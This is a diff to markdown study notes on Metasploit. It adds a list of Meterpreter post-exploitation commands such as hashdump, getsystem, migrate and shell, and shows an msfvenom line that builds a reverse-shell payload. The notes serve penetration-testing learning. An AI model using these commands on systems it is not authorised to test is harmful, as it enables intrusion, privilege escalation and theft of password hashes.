@@ -134,6 +134,8 @@ An exploitation framework. Has commercial GUI version **Metasploit Pro** and FOS
 
 `search type:[moduleType] [keyword]` - Search for modules, CVE numbers, exploit names (eternalblue, heartbleed), target system. Type is optional. Example: `search type:auxiliary telnet` will search for auxiliary modules for telnet.
 
+`msfvenom --list payloads` - show all payloads
+
 `use [module]` - Change context to a module. Example: `use exploit/windows/smb/ms17_010_eternalblue`
 
 `use [integer]` - Use module number returned by search command. Example: `use 0`.
@@ -184,6 +186,8 @@ An exploitation framework. Has commercial GUI version **Metasploit Pro** and FOS
 
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f elf > rev_shell.elf` - create payload for Linux
 
+`msfvenom --list payloads` - show all payloads
+
 ### Low hanging fruits
 
 **HTTP**: Could host a web application with vulns like
@@ -196,6 +200,26 @@ SQL injection or RCE.
 **SSH**: Could have default or easy to guess credentials
 
 **RDP**: Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used.
+
+### Meterpreter
+
+`help` - always type help to see what commands are available. Changes depending on version.
+
+`getuid` - Display current user. Useful for checking privilege level.
+
+`ps` - list running processes
+
+`migrate` - migrate meterpreter to another process. Migrating to process started by lower privileged user might lose meterpreter privileges.
+
+`search -f [filename]` - search for files.
+
+`shell` - start regular command line shell on target system
+
+`hashdump` - list content of SAM (Security Account Manager) db to see user's NTLM hashes.
+
+`getsystem` - attempt to elevate privileges to that of local system
+
+`load [tool name]` - load tool. Using `help` will now show more options.
 
 ### Modules
 
